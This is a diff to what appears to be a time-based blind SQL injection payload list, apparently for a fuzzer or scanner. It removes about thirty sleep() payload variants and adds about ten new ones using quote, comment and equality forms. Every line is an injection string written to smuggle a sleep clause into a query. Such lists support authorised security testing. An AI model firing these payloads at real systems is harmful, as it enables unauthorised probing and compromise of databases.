@@ -1,32 +1,10 @@
-sleep(__TIME__)#
-1 or sleep(__TIME__)#
-" or sleep(__TIME__)#
-' or sleep(__TIME__)#
-" or sleep(__TIME__)="
-' or sleep(__TIME__)='
-1) or sleep(__TIME__)#
-") or sleep(__TIME__)="
-') or sleep(__TIME__)='
-1)) or sleep(__TIME__)#
-")) or sleep(__TIME__)="
-')) or sleep(__TIME__)='
-1 and sleep(__TIME__)#
-" and sleep(__TIME__)#
-' and sleep(__TIME__)#
-" and sleep(__TIME__)="
+[space]and sleep(__TIME__)
+[space]or sleep(__TIME__) #[space]
 ' and sleep(__TIME__)='
-1) and sleep(__TIME__)#
-") and sleep(__TIME__)="
-') and sleep(__TIME__)='
-1)) and sleep(__TIME__)#
-")) and sleep(__TIME__)="
-')) and sleep(__TIME__)='
-1; SELECT sleep(__TIME__)#
-" ; SELECT sleep(__TIME__)#
-' ; SELECT sleep(__TIME__)#
-1) ; SELECT sleep(__TIME__)#
-") ; SELECT sleep(__TIME__)#
-') ; SELECT sleep(__TIME__)#
-1)) ; SELECT sleep(__TIME__)#
-")) ; SELECT sleep(__TIME__)#
-')) ; SELECT sleep(__TIME__)#
+' and sleep(__TIME__) #[space]
+" and sleep(__TIME__)="
+' or sleep(__TIME__) #[space]
+" or sleep(__TIME__) #[space]
+'=sleep(__TIME__)='
+"=sleep(__TIME__)="
+' where sleep(__TIME__) #[space]
